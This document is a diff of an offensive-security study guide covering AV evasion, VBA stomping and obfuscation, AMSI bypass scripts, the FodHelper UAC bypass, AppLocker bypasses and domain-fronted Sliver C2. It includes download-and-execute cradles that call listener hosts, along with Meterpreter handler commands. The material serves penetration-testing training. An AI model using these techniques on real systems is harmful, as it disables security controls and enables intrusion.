-<p>Once found, modifying a single byte at that offset often defeats the signature match. If changing the exact offset byte does not evade detection, try the byte immediately before or after it. Note that a modified binary may lose functionality if the changed byte is part of shellcode — this approach works best for wrapper code, not embedded shellcode.</p>
+<p>Once found, modifying a single byte at that offset often defeats the signature match. If changing the exact offset byte does not evade detection, try the byte immediately before or after it. Note that a modified binary may lose functionality if the changed byte is part of shellcode, this approach works best for wrapper code, not embedded shellcode.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -3368,7 +3368,7 @@ $bytes[[offset]] = 0
 </ul>
 
 <h3 id="metasploit-encoders-encryptors">8.3 Metasploit Encoders and Encryptors</h3>
-<p>Metasploit's <code>msfvenom</code> tool provides both encoders and encryptors for payload obfuscation. Encoders such as <code>x86/shikata_ga_nai</code> produce polymorphic output but include a static decoder stub that is itself a detectable signature. Encryptors such as AES256 wrap the payload in encryption but similarly require a static decryption routine in the executable — both approaches are well-known to AV vendors and have signatures written for them.</p>
+<p>Metasploit's <code>msfvenom</code> tool provides both encoders and encryptors for payload obfuscation. Encoders such as <code>x86/shikata_ga_nai</code> produce polymorphic output but include a static decoder stub that is itself a detectable signature. Encryptors such as AES256 wrap the payload in encryption but similarly require a static decryption routine in the executable, both approaches are well-known to AV vendors and have signatures written for them.</p>
 <p>64-bit payloads are less commonly seen than 32-bit variants, so a raw 64-bit Meterpreter may slip past older signature databases. Supplying a custom PE template with <code>-x</code> replaces the default msfvenom wrapper, which may carry its own signature. These techniques are building blocks for understanding the problem; custom code is needed for reliable evasion.</p>
 
 <table class="custom-table">
@@ -3514,7 +3514,7 @@ static void Main(string[] args) {
 
 <h3 id="non-emulated-apis">8.6 Non-Emulated API Bypass</h3>
 <p><code>VirtualAllocExNuma</code> allocates memory optimized for NUMA (Non-Uniform Memory Access) multi-processor systems. Because it is uncommon on standard single-CPU workstations, many AV emulators do not implement it. When the emulator encounters an unimplemented API, the call fails and returns NULL. The runner checks the return value and exits if allocation failed, detecting emulation before any malicious action occurs.</p>
-<p>There is no definitive list of non-emulated APIs. Obscure Win32 APIs with niche hardware or performance purposes are good candidates — browsing MSDN for specialized memory, fiber, or NUMA-related APIs often surfaces viable options. <code>FlsAlloc</code> (Fiber Local Storage) is another documented candidate.</p>
+<p>There is no definitive list of non-emulated APIs. Obscure Win32 calls tied to niche hardware or performance concerns tend to be safe candidates, and browsing MSDN for specialised memory, fiber, or NUMA-related APIs surfaces new options regularly. <code>FlsAlloc</code> (Fiber Local Storage) is another well-documented candidate.</p>
 
 <table class="custom-table">
 <thead><tr><th>API</th><th>DLL</th><th>Why Non-Emulated</th></tr></thead>
@@ -3558,7 +3558,7 @@ static void Main(string[] args) {
 
 <h3 id="vba-bypass">8.7 VBA Antivirus Bypass</h3>
 <p>VBA shellcode runners embedded in Office documents face both signature detection on the shellcode bytes and heuristic detection of recognizable API patterns. Encrypting the shellcode with a Caesar cipher and implementing Sleep-based emulation detection addresses both layers, though the techniques are less effective in VBA than in C# because AV vendors focus heavily on Office macro evasion.</p>
-<p>A more advanced technique — <strong>VBA Stomping</strong> — exploits the dual representation of VBA code in Office files: compiled P-code (for the exact Office version) and compressed source code. When the document is opened on the matching Office version, only the P-code executes. By zeroing out the source code (while preserving P-code), the macro disappears from the VBA editor while still running on execution — significantly reducing detection rates because most AV tools inspect the source rather than the compiled P-code.</p>
+<p>A more advanced technique, <strong>VBA Stomping</strong>, exploits the dual representation of VBA code in Office files: compiled P-code (for the exact Office version) and compressed source code. When the document is opened on the matching Office version, only the P-code executes. By zeroing out the source code (while preserving P-code), the macro disappears from the VBA editor while still running on execution, significantly reducing detection rates because most AV tools inspect the source rather than the compiled P-code.</p>
 
 <table class="custom-table">
 <thead><tr><th>Technique</th><th>Mechanism</th><th>Effect</th></tr></thead>
@@ -3616,7 +3616,7 @@ python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char 
 </ul>
 
 <h3 id="wmi-dechaining">8.8 WMI Process Dechaining</h3>
-<p>When VBA launches PowerShell via the <code>Shell</code> function, PowerShell becomes a child process of Microsoft Word — a highly suspicious process relationship that AV and EDR tools flag by default. Using the WMI <code>Win32_Process.Create</code> method instead spawns PowerShell as a child of <code>WmiPrvSE.exe</code>, breaking the detection chain.</p>
+<p>When VBA launches PowerShell via the <code>Shell</code> function, PowerShell becomes a child process of Microsoft Word, a highly suspicious process relationship that AV and EDR tools flag by default. Using the WMI <code>Win32_Process.Create</code> method instead spawns PowerShell as a child of <code>WmiPrvSE.exe</code>, breaking the detection chain.</p>
 
 <figure><img src="/assets/images/osep/word-child-process.png" alt="cmd.exe as child of WINWORD.EXE"></figure>
 <p>The <code>GetObject</code>, <code>Get</code>, and <code>Create</code> VBA methods used in WMI process creation are more ambiguous to AV products than the explicit <code>Shell</code> function. This technique alone does not reduce detection rates significantly, but it is a prerequisite for the string obfuscation step that follows.</p>
@@ -3646,7 +3646,7 @@ End Sub</code></pre>
 </ul>
 
 <h3 id="vba-obfuscation">8.9 VBA String Obfuscation</h3>
-<p>Three static strings in the WMI-based VBA macro are prime signature targets: the PowerShell download cradle, the WMI connection string (<code>winmgmts:</code>), and the WMI class name (<code>Win32_Process</code>). Two obfuscation approaches address these. The first uses <code>StrReverse</code> to reverse strings, replacing the original signature with its mirror. The second — more robust — converts each character to its Caesar-shifted decimal value and decrypts at runtime using food-named helper functions to minimize recognizable function names.</p>
+<p>Three static strings in the WMI-based VBA macro are prime signature targets: the PowerShell download cradle, the WMI connection string (<code>winmgmts:</code>), and the WMI class name (<code>Win32_Process</code>). <code>StrReverse</code> handles the easy case; the flipped literal no longer matches the vendor signature. The stronger approach converts each character to its Caesar-shifted decimal value and decrypts at runtime through helper functions named after food (recipes, ingredients, cooking verbs), so that neither the strings nor the calling context match anything an analyst has seen before.</p>
 <p>Adding a document name check as a heuristic emulation bypass completes the chain. When AV products emulate a document, they typically rename it. Checking <code>ActiveDocument.Name</code> against the expected filename (also encrypted) exits cleanly if the names do not match, bypassing the emulator while executing normally for the intended victim.</p>
 
 <h4>8.9.1 PowerShell Encryption Script (for VBA String Obfuscation)</h4>
@@ -3718,7 +3718,7 @@ python3 -c "payload=\"$payload\"; print(''.join(f'{ord(char) + 17:03}' for char 
 
 <h3 id="windbg-introduction">9.1 WinDbg Introduction</h3>
 
-<p>WinDbg is the Windows debugger used for inspecting and modifying code execution at the assembly level. Understanding WinDbg basics is essential for AMSI bypass development — the AMSI context corruption technique was discovered by inspecting the <code>AmsiOpenSession</code> function in WinDbg and identifying a header validation check that can be subverted.</p>
+<p>WinDbg is the Windows debugger used for inspecting and modifying code execution at the assembly level. Understanding WinDbg basics is essential for AMSI bypass development, the AMSI context corruption technique was discovered by inspecting the <code>AmsiOpenSession</code> function in WinDbg and identifying a header validation check that can be subverted.</p>
 
 <p>The core workflow is: attach to a running process, set breakpoints on target functions, step through individual assembly instructions, and inspect or modify register and memory contents. WinDbg supports both 32-bit and 64-bit debugging, unlike Immunity Debugger which is 32-bit only.</p>
 
@@ -3798,7 +3798,7 @@ amsi!AmsiOpenSession:
 </ul>
 
 <h3 id="amsi-overview">9.2 AMSI Overview</h3>
-<p>The <strong>Antimalware Scan Interface (AMSI)</strong>, introduced in Windows 10, intercepts every PowerShell, JScript, VBScript, VBA (Office 2019+), and .NET (4.8+) command at runtime and passes the content buffer to the registered antivirus provider — typically Windows Defender — via RPC before execution. AMSI runs inside the scripting host process (e.g., <code>powershell.exe</code>, <code>wscript.exe</code>) through the loaded <code>AMSI.DLL</code>.</p>
+<p>The <strong>Antimalware Scan Interface (AMSI)</strong>, introduced in Windows 10, intercepts every PowerShell, JScript, VBScript, VBA (Office 2019+), and .NET (4.8+) command at runtime and passes the content buffer to the registered antivirus provider, typically Windows Defender, via RPC before execution. AMSI runs inside the scripting host process (e.g., <code>powershell.exe</code>, <code>wscript.exe</code>) through the loaded <code>AMSI.DLL</code>.</p>
 
 <table class="custom-table">
 <thead><tr><th>AMSI API</th><th>Purpose</th><th>Bypass Relevance</th></tr></thead>
@@ -3831,7 +3831,7 @@ onLeave: function (log, retval, state) {
 }</code></pre>
 
 <h3 id="amsi-reflection-bypass">9.3 AMSI Bypass via Reflection</h3>
-<p>The <code>amsiContext</code> structure stored by <code>AmsiInitialize</code> begins with the four-byte ASCII header <code>AMSI</code>. The <code>AmsiOpenSession</code> function validates this header on every call — if it does not match <code>0x49534D41</code>, the function returns <code>E_INVALIDARG</code> (0x80070057) and AMSI is effectively disabled for the session. By overwriting those four header bytes with zeros from PowerShell, AMSI shuts down without crashing the process.</p>
+<p>The <code>amsiContext</code> structure stored by <code>AmsiInitialize</code> begins with the four-byte ASCII header <code>AMSI</code>. The <code>AmsiOpenSession</code> function validates this header on every call, if it does not match <code>0x49534D41</code>, the function returns <code>E_INVALIDARG</code> (0x80070057) and AMSI is effectively disabled for the session. By overwriting those four header bytes with zeros from PowerShell, AMSI shuts down without crashing the process.</p>
 <p>The <code>amsiContext</code> address is held in the private static <code>amsiContext</code> field of the managed <code>System.Management.Automation.AmsiUtils</code> class. Because the string <code>AmsiUtils</code> is itself a Windows Defender signature, both the type and field must be resolved dynamically using <code>GetTypes()</code> and wildcard pattern matching to avoid triggering detection.</p>
 
 <h4>9.3.1 AMSI Bypass via amsiContext Corruption (PowerShell One-Liner)</h4>
@@ -3873,7 +3873,7 @@ sliver (SESSION) > sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.Language
 </ul>
 
 <h3 id="amsi-binary-patch">9.4 AMSI Bypass via Binary Patching</h3>
-<p>Instead of corrupting the <code>amsiContext</code> data structure, binary patching modifies the machine code of <code>AmsiOpenSession</code> itself. The first instruction is <code>TEST RDX,RDX</code> (bytes <code>0x48 0x85 0xD2</code>), followed by a conditional jump (<code>JE</code>) that leads to the error return path. Replacing <code>TEST RDX,RDX</code> with <code>XOR RAX,RAX</code> (bytes <code>0x48 0x31 0xC0</code>) forces the zero flag to be set on every call, making every invocation jump immediately to the <code>E_INVALIDARG</code> return — permanently disabling AMSI in the current process without touching data structures.</p>
+<p>Instead of corrupting the <code>amsiContext</code> data structure, binary patching modifies the machine code of <code>AmsiOpenSession</code> itself. The first instruction is <code>TEST RDX,RDX</code> (bytes <code>0x48 0x85 0xD2</code>), followed by a conditional jump (<code>JE</code>) that leads to the error return path. Replacing <code>TEST RDX,RDX</code> with <code>XOR RAX,RAX</code> (bytes <code>0x48 0x31 0xC0</code>) forces the zero flag to be set on every call, making every invocation jump immediately to the <code>E_INVALIDARG</code> return, permanently disabling AMSI in the current process without touching data structures.</p>
 <p>The three-byte patch is applied from PowerShell using reflection to resolve the <code>AmsiOpenSession</code> address via <code>GetModuleHandle</code>/<code>GetProcAddress</code>, then <code>VirtualProtect</code> to make the page writable, <code>Marshal.Copy</code> to write the patch, and <code>VirtualProtect</code> again to restore original memory permissions.</p>
 
 <h4>9.4.1 AMSI Patch via PowerShell Reflection (Full Script)</h4>
@@ -3948,7 +3948,7 @@ iex((new-object system.net.webclient).downloadstring('http://[listener-ip]/[scri
 </ul>
 
 <h3 id="uac-bypass-vs-defender">9.5 UAC Bypass vs. Windows Defender (FodHelper)</h3>
-<p>The FodHelper UAC bypass abuses <code>fodhelper.exe</code> — a Windows 10 optional features manager that runs at high integrity — by creating a registry key at <code>HKCU:\Software\Classes\ms-settings\shell\open\command</code> with a <code>DelegateExecute</code> value. When fodhelper runs, it reads this key and executes the default value as a high-integrity process. Because this operates on the current user's writable HKCU hive, no admin rights are required to set it up.</p>
+<p>The FodHelper UAC bypass abuses <code>fodhelper.exe</code>, a Windows 10 optional features manager that runs at high integrity, by creating a registry key at <code>HKCU:\Software\Classes\ms-settings\shell\open\command</code> with a <code>DelegateExecute</code> value. When fodhelper runs, it reads this key and executes the default value as a high-integrity process. Because this operates on the current user's writable HKCU hive, no admin rights are required to set it up.</p>
 <p>The Metasploit fodhelper module triggers AMSI on the PowerShell component it spawns. To succeed, the PowerShell download cradle stored in the registry value must include an AMSI bypass. The second stage Meterpreter payload also requires stage encoding to survive network-level AV inspection during delivery.</p>
 
 <h4>9.5.1 FodHelper UAC Bypass (Manual)</h4>
@@ -4092,7 +4092,7 @@ reg delete "HKCU\Software\Microsoft\Windows Script\Settings" /v AmsiEnable /f</c
 <h2 id="application-whitelisting">10. Application Whitelisting</h2>
 
 <h3 id="aw-theory">10.1 AppLocker Theory</h3>
-<p>Application whitelisting is a host-based protection mechanism that blocks all software execution except applications explicitly defined in a pre-approved ruleset. Microsoft's AppLocker leverages the kernel-mode driver <strong>APPID.SYS</strong> and the <strong>APPIDSVC</strong> user-mode service, which register a notification callback via <code>PsSetCreateProcessNotifyRoutineEx</code> to intercept every new process creation and evaluate it against the ruleset.</p>
+<p>Application whitelisting is a host-based protection mechanism that blocks all software execution except applications explicitly defined in a pre-approved ruleset. Microsoft's AppLocker consists of the kernel-mode driver <strong>APPID.SYS</strong> and the <strong>APPIDSVC</strong> user-mode service, which register a notification callback via <code>PsSetCreateProcessNotifyRoutineEx</code> to intercept every new process creation and evaluate it against the ruleset.</p>
 <p>AppLocker is available on Windows Enterprise and Ultimate editions only. A newer and stricter implementation, Windows Defender Application Control (WDAC), operates at the HyperVisor level using Virtualization-based Security (VBS) and HyperVisor Code Integrity (HVCI), though it is rarely deployed in practice due to strict hardware requirements.</p>
 
 <table class="custom-table">
@@ -4152,7 +4152,7 @@ C:\Users\[user]\calc2.exe
 </ul>
 
 <h3 id="aw-trusted-folders">10.2 Trusted Folder Bypass</h3>
-<p>The default AppLocker path rules whitelist <code>C:\Program Files</code>, <code>C:\Program Files (x86)</code>, and <code>C:\Windows</code> recursively. Because non-admin users cannot write to most of these directories, this appears safe. However, several subdirectories within <code>C:\Windows</code> are writable by standard users — and if they also allow execute, AppLocker's path rules become a bypass vehicle.</p>
+<p>The default AppLocker path rules whitelist <code>C:\Program Files</code>, <code>C:\Program Files (x86)</code>, and <code>C:\Windows</code> recursively. Because non-admin users cannot write to most of these directories, this appears safe. However, several subdirectories within <code>C:\Windows</code> are writable by standard users, and if they also allow execute, AppLocker's path rules become a bypass vehicle.</p>
 <p>The key writable and executable directories under default AppLocker rules include <code>C:\Windows\Tasks</code> and <code>C:\Windows\Temp</code>. Because these paths fall within the whitelisted <code>C:\Windows</code> tree, any binary or DLL placed there executes without restriction. This is the simplest and most reliable AppLocker bypass.</p>
 
 <table class="custom-table">
@@ -4190,7 +4190,7 @@ sliver ([session]) > inline-execute-assembly /home/kali/tools/bins/csharp-files/
 
 <h3 id="aw-dll-bypass">10.3 DLL Bypass</h3>
 <p>AppLocker's default ruleset does not include DLL enforcement. This means that unmanaged DLLs can be freely loaded via <code>rundll32.exe</code>, which is a signed Microsoft binary residing in <code>C:\Windows\System32</code> and therefore always whitelisted. An attacker can compile a DLL exporting a function with arbitrary shellcode and invoke it directly through <code>rundll32</code>.</p>
-<p>If DLL enforcement is later enabled via the AppLocker Advanced tab, the same trusted-folder bypass applies — copying the DLL into <code>C:\Windows\Tasks</code> bypasses the DLL rules because the default DLL rules whitelist the <code>C:\Windows</code> path tree recursively.</p>
+<p>If DLL enforcement is later enabled via the AppLocker Advanced tab, the same trusted-folder bypass applies, copying the DLL into <code>C:\Windows\Tasks</code> bypasses the DLL rules because the default DLL rules whitelist the <code>C:\Windows</code> path tree recursively.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -4243,7 +4243,7 @@ rundll32 C:\Windows\Tasks\[payload].dll,run</code></pre>
 </ul>
 
 <h3 id="aw-clm">10.5 PowerShell Constrained Language Mode</h3>
-<p>When AppLocker or WDAC enforces script rules, PowerShell automatically drops into <strong>Constrained Language Mode (CLM)</strong>. CLM prohibits calls to the .NET framework, C# compilation, reflection, and COM objects — effectively neutering most PowerShell-based tradecraft. Scripts that reside in whitelisted locations run with full functionality, but interactive commands and non-whitelisted scripts are restricted.</p>
+<p>When AppLocker or WDAC enforces script rules, PowerShell automatically drops into <strong>Constrained Language Mode (CLM)</strong>. CLM prohibits calls to the .NET framework, C# compilation, reflection, and COM objects, effectively neutering most PowerShell-based tradecraft. Scripts that reside in whitelisted locations run with full functionality, but interactive commands and non-whitelisted scripts are restricted.</p>
 <p>PowerShell version 2 (if installed) can sometimes bypass CLM by specifying <code>-Version 2</code> at launch. On Windows 7 and early Windows 10 builds, this remains viable. On modern systems, the more reliable approach is a custom runspace built in C# or the InstallUtil bypass described in subsequent sections.</p>
 
 <table class="custom-table">
@@ -4280,7 +4280,7 @@ sliver ([session]) > execute-assembly -i /home/kali/tools/bins/csharp-files/Stra
 
 <h3 id="aw-custom-runspaces">10.6 Custom Runspaces</h3>
 <p>PowerShell.exe is a thin wrapper around <code>System.Management.Automation.dll</code>. A C# application can bypass CLM entirely by directly instantiating a custom PowerShell runspace using the public APIs in the <code>System.Management.Automation.Runspaces</code> namespace. Scripts executed inside a custom runspace are not evaluated by AppLocker's PowerShell CLM enforcement and always run in <strong>FullLanguage</strong> mode.</p>
-<p>This technique also avoids any AppLocker deny rules targeting <code>powershell.exe</code> itself, since the managed code runs inside a custom process — not PowerShell.exe. The C# executable must still be placed in a whitelisted directory or delivered through a bypass technique such as InstallUtil.</p>
+<p>This technique also avoids any AppLocker deny rules targeting <code>powershell.exe</code> itself, since the managed code runs inside a custom process, not PowerShell.exe. The C# executable must still be placed in a whitelisted directory or delivered through a bypass technique such as InstallUtil.</p>
 
 <h4>10.6.1 Custom Runspace C# Template</h4>
 <pre><code class="language-csharp">using System;
@@ -4345,7 +4345,7 @@ sliver ([session]) > inline-execute-assembly /home/kali/tools/bins/csharp-files/
 </ul>
 
 <h3 id="aw-installutil">10.7 CLM Bypass via InstallUtil</h3>
-<p><strong>InstallUtil.exe</strong> is a signed Microsoft .NET utility located in <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code> and is always whitelisted by AppLocker's default publisher and path rules. By placing custom C# code inside the <code>Uninstall</code> method of a class that inherits from <code>System.Configuration.Install.Installer</code>, an attacker can trigger arbitrary execution through InstallUtil with the <code>/U</code> flag — completely bypassing AppLocker's executable rules.</p>
+<p><strong>InstallUtil.exe</strong> is a signed Microsoft .NET utility located in <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code> and is always whitelisted by AppLocker's default publisher and path rules. By placing custom C# code inside the <code>Uninstall</code> method of a class that inherits from <code>System.Configuration.Install.Installer</code>, an attacker can trigger arbitrary execution through InstallUtil with the <code>/U</code> flag, completely bypassing AppLocker's executable rules.</p>
 <p>The <code>Main</code> method still must exist in the compiled binary but can contain decoy code. The real payload lives in <code>Uninstall</code>, which InstallUtil invokes without requiring administrative privileges when called with <code>/U</code>. Combining this with a custom runspace delivers unrestricted PowerShell execution inside an AppLocker-enforced environment.</p>
 
 <h4>10.7.1 InstallUtil Bypass C# Template</h4>
@@ -4387,7 +4387,7 @@ namespace Bypass
 </code></pre>
 
 <h4>10.7.2 Delivery via certutil and bitsadmin (Living off the Land)</h4>
-<p>The compiled binary must be present on disk before InstallUtil is invoked. To avoid direct binary download detection, encode the executable with Base64 using <code>certutil</code>, serve the encoded file, download it with <code>bitsadmin</code>, decode it, and then execute with InstallUtil — all native signed Microsoft binaries.</p>
+<p>The compiled binary must be present on disk before InstallUtil is invoked. To avoid direct binary download detection, encode the executable with Base64 using <code>certutil</code>, serve the encoded file, download it with <code>bitsadmin</code>, decode it, and then execute with InstallUtil, all native signed Microsoft binaries.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -4419,8 +4419,8 @@ sliver ([session]) > inline-execute-assembly /home/kali/tools/bins/csharp-files/
 </ul>
 
 <h3 id="aw-reflective-injection">10.8 Reflective Injection via Custom Runspace</h3>
-<p>With the custom runspace and InstallUtil bypass in place, it is possible to revive reflective DLL injection tradecraft even when AppLocker DLL enforcement is active. The PowerShell script executed inside the custom runspace downloads a Meterpreter DLL into a byte array and passes it directly to <code>Invoke-ReflectivePEInjection</code> — bypassing both the executable rules and the DLL rules, since the DLL never touches disk as a standalone file.</p>
-<p>The DLL is loaded entirely in memory into an existing process (typically <code>explorer.exe</code>), which makes this technique highly effective against DLL enforcement rules. The key insight is that AppLocker's DLL rules apply to DLLs loaded from disk paths, not to DLLs reflectively injected from byte arrays in memory.</p>
+<p>With the custom runspace and InstallUtil bypass in place, it is possible to revive reflective DLL injection tradecraft even when AppLocker DLL enforcement is active. The PowerShell script executed inside the custom runspace downloads a Meterpreter DLL into a byte array and passes it directly to <code>Invoke-ReflectivePEInjection</code>, bypassing both the executable rules and the DLL rules, since the DLL never touches disk as a standalone file.</p>
+<p>The DLL is loaded entirely in memory into an existing process (typically <code>explorer.exe</code>), which sidesteps DLL enforcement outright. AppLocker's DLL rules evaluate loads from disk paths; a DLL reflectively injected from a byte array never touches a file-system path and never reaches the rule engine.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -4447,7 +4447,7 @@ sliver ([session]) > inline-execute-assembly /home/kali/tools/bins/csharp-files/
 </ul>
 
 <h3 id="aw-workflow-compiler">10.9 C# Bypass via Microsoft.Workflow.Compiler</h3>
-<p><code>Microsoft.Workflow.Compiler.exe</code> is a signed Microsoft binary located in <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code> and is whitelisted by default AppLocker rules. Reverse engineering reveals that it accepts two command-line arguments: a serialized XML file containing compiler parameters and the path to a C# source file, and an output XML path for results. The binary compiles the C# source in memory, loads the resulting assembly, and instantiates any class that inherits from <code>System.Workflow.ComponentModel.Activity</code> — invoking its constructor.</p>
+<p><code>Microsoft.Workflow.Compiler.exe</code> is a signed Microsoft binary located in <code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code> and is whitelisted by default AppLocker rules. Reverse engineering reveals that it accepts two command-line arguments: a serialized XML file containing compiler parameters and the path to a C# source file, and an output XML path for results. The binary compiles the C# source in memory, loads the resulting assembly, and instantiates any class that inherits from <code>System.Workflow.ComponentModel.Activity</code>, invoking its constructor.</p>
 <p>This means an attacker can execute arbitrary C# code by providing a crafted XML configuration file and a C# source file. Both files must exist on disk, but the compiled assembly is loaded in memory without AppLocker restrictions because the compilation is performed by a trusted, signed binary. The XML input file must be generated using PowerShell reflection against the <code>SerializeInputToWrapper</code> private method inside <code>Microsoft.Workflow.Compiler.exe</code>.</p>
 
 <h4>10.9.1 Step 1: Generate the XML Input File (Attacker / Admin PowerShell)</h4>
@@ -4518,7 +4518,7 @@ sliver ([session]) > inline-execute-assembly /home/kali/tools/bins/csharp-files/
 </ul>
 
 <h3 id="aw-jscript-mshta">10.10 JScript and MSHTA</h3>
-<p><strong>mshta.exe</strong> is a signed Microsoft binary that executes HTML Application (.hta) files containing embedded Jscript or VBScript. Because mshta.exe lives in <code>C:\Windows\System32</code>, it is whitelisted by AppLocker's default rules. An attacker can embed arbitrary Jscript — including DotNetToJscript shellcode runners — inside an HTA file and deliver it via email attachment, HTML smuggling, or a shortcut (.lnk) file pointing to a remote URL.</p>
+<p><strong>mshta.exe</strong> is a signed Microsoft binary that executes HTML Application (.hta) files containing embedded Jscript or VBScript. Because mshta.exe lives in <code>C:\Windows\System32</code>, it is whitelisted by AppLocker's default rules. An attacker can embed arbitrary Jscript, including DotNetToJscript shellcode runners, inside an HTA file and deliver it via email attachment, HTML smuggling, or a shortcut (.lnk) file pointing to a remote URL.</p>
 <p>The shortcut file approach is particularly effective: the victim receives only a .lnk file that silently invokes mshta.exe with a remote HTA URL. mshta.exe downloads and executes the HTA without spawning PowerShell or any other visible process, allowing the embedded Jscript to run entirely within the mshta.exe process context and bypass script-based AppLocker rules.</p>
 
 <h4>10.10.1 Proof-of-Concept HTA File</h4>
@@ -4563,7 +4563,7 @@ C:\Windows\System32\mshta.exe http://[listener-ip]/[payload].hta</code></pre>
 
 <h3 id="aw-xsl-transform">10.11 XSL Transform</h3>
 <p>The XSLT specification permits embedded Jscript or VBScript execution as part of the XML transformation process. <strong>WMIC</strong> (Windows Management Instrumentation Command-line) is a signed Microsoft binary that supports the <code>/format:</code> switch to specify an XSL stylesheet, which can be fetched from a remote URL. Because WMIC resides in <code>C:\Windows\System32\wbem\</code>, it is whitelisted by AppLocker, and any Jscript embedded in the XSL document executes within the wmic.exe process.</p>
-<p>This technique — known as Squiblytwo (MITRE ATT&CK T1220) — provides a second Jscript execution vector independent of mshta.exe. Like the HTA approach, it can be weaponized with DotNetToJscript payloads and delivered via shortcut files, making it a reliable fallback if MSHTA is denied.</p>
+<p>This technique, known as Squiblytwo (MITRE ATT&CK T1220), provides a second Jscript execution vector independent of mshta.exe. Like the HTA approach, it can be weaponized with DotNetToJscript payloads and delivered via shortcut files, making it a reliable fallback if MSHTA is denied.</p>
 
 <h4>10.11.1 Proof-of-Concept XSL File</h4>
 <pre><code class="language-xml">&lt;?xml version='1.0'?&gt;
@@ -4616,7 +4616,7 @@ msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter
 
 <p>AppLocker only enforces rules against native Windows executable file types (.exe, .dll, .ps1, .js, .vbs, .bat, .cmd). If a third-party scripting engine like Python, Perl, or Java is installed on the target, it can execute arbitrary code without restriction because AppLocker has no rule category for these runtimes.</p>
 
-<p>VBA macros inside Microsoft Office documents are also exempt — even if the Office document is saved to a non-whitelisted folder, AppLocker cannot restrict execution of embedded macros. This makes Office documents particularly effective in AppLocker-hardened environments.</p>
+<p>VBA macros inside Microsoft Office documents are also exempt, even if the Office document is saved to a non-whitelisted folder, AppLocker cannot restrict execution of embedded macros. This makes Office documents particularly effective in AppLocker-hardened environments.</p>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -4707,7 +4707,7 @@ sliver ([session]) > sharpsh -i -t 40 -- '-u http://[listener-ip]/HostRecon.ps1 
 
 <h2 id="network-filters">11. Bypassing Network Filters</h2>
 
-<p>Enterprise networks deploy layered egress defenses that inspect, log, and block outbound traffic before it reaches the Internet. As penetration testers, we must understand each defensive layer, identify which are deployed in a target environment, and apply the appropriate bypass technique for each. The goal is rarely complete invisibility — it is to remain below the detection threshold by generating traffic that appears legitimate.</p>
+<p>Enterprise egress is layered by design. DNS filters reject unrecognised domains. Web proxies inspect HTTP and drop suspicious User-Agents or categories. IDS/IPS platforms match packets against signature libraries. TLS interception re-terminates the connection and inspects the plaintext under an internal CA. Each layer fails in its own way, and the correct bypass depends on which layer is actually in path. Complete invisibility is rarely the objective; staying below the detection threshold of whichever sensor fires first is.</p>
 
 <table class="custom-table">
 <thead><tr><th>Defensive Layer</th><th>Mechanism</th><th>Bypass Strategy</th></tr></thead>
@@ -4843,7 +4843,7 @@ powershell -c "(New-Object System.Net.WebClient).DownloadString('http://[domain]
 
 <p>Intrusion Detection Systems (IDS) passively copy traffic for analysis, while Intrusion Prevention Systems (IPS) sit inline and can actively drop traffic. Both perform deep packet inspection, reassembling fragmented IP packets and matching application-layer content against known signatures. Because signatures must be very specifically tuned to avoid false positives, small changes to traffic patterns can invalidate them entirely.</p>
 
-<p>A classic example is the Didier Stevens Meterpreter Snort rule, which matched a hardcoded "RECV" string in early HTTP POST URIs. Another is the Fox-IT detection of an extraneous space in a C2 framework's HTTP protocol header. These examples demonstrate that minor, identifiable patterns are the anchor points for IDS rules — and therefore the targets for evasion.</p>
+<p>A classic example is the Didier Stevens Meterpreter Snort rule, which matched a hardcoded "RECV" string in early HTTP POST URIs. Another is the Fox-IT detection of an extraneous space in a C2 framework's HTTP protocol header. These examples demonstrate that minor, identifiable patterns are the anchor points for IDS rules, and therefore the targets for evasion.</p>
 
 <table class="custom-table">
 <thead><tr><th>IDS/IPS Concept</th><th>Detail</th></tr></thead>
@@ -5059,7 +5059,7 @@ sliver > https -L 0.0.0.0 --lport 443</code></pre>
 
 <h4 id="nf-domain-fronting-lab">11.6.2 Methodology: Sliver Behind Azure CDN (End-to-End Lab)</h4>
 
-<p>This lab reproduces the domain fronting flow end-to-end using Sliver as the C2 framework. The goal is to have a Windows implant call home to a trusted "frontable" domain (visible in DNS and in the TLS SNI), while the encrypted HTTP <code>Host</code> header points at the operator-controlled CDN endpoint that fronts the actual Sliver listener. Because Sliver ships a Malleable-style HTTP C2 profile (<code>~/.sliver/configs/http-c2.json</code>), it can be configured to accept requests with any Host header — the prerequisite for the CDN to route traffic to the listener after Azure rewrites the Host.</p>
+<p>This lab reproduces the domain fronting flow end-to-end using Sliver as the C2 framework. The goal is to have a Windows implant call home to a trusted "frontable" domain (visible in DNS and in the TLS SNI), while the encrypted HTTP <code>Host</code> header points at the operator-controlled CDN endpoint that fronts the actual Sliver listener. Because Sliver ships a Malleable-style HTTP C2 profile (<code>~/.sliver/configs/http-c2.json</code>), it can be configured to accept requests with any Host header, the prerequisite for the CDN to route traffic to the listener after Azure rewrites the Host.</p>
 
 <table class="custom-table">
 <thead><tr><th>Parameter</th><th>Value</th><th>Purpose</th></tr></thead>
@@ -5536,9 +5536,9 @@ Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber</code>
 </li>
 </ul>
 <h2 id="linux-post-exploitation">13. Linux Privilege Escalation</h2>
-<p>Linux powers the majority of servers, cloud environments, and IoT devices worldwide. Post-exploitation on Linux goes beyond basic enumeration — configuration files, text editors, and shared libraries each present distinct attack vectors for persistence, privilege escalation, and AV evasion.</p>
+<p>Linux privilege escalation looks different from Windows. There is no registry, no service manager in the Windows sense, and much of the escalation work involves reading text files an administrator forgot to lock down. The enumeration surface is smaller than on Windows; the abuse surface is not. A NOPASSWD sudoers entry pointing at <code>vim</code> or <code>less</code> yields root without a single exploit. So does a world-writable directory on <code>LD_LIBRARY_PATH</code>. So does an SUID binary that shells out through <code>system()</code>. Kernel exploits belong after the misconfiguration path has been exhausted, not before.</p>
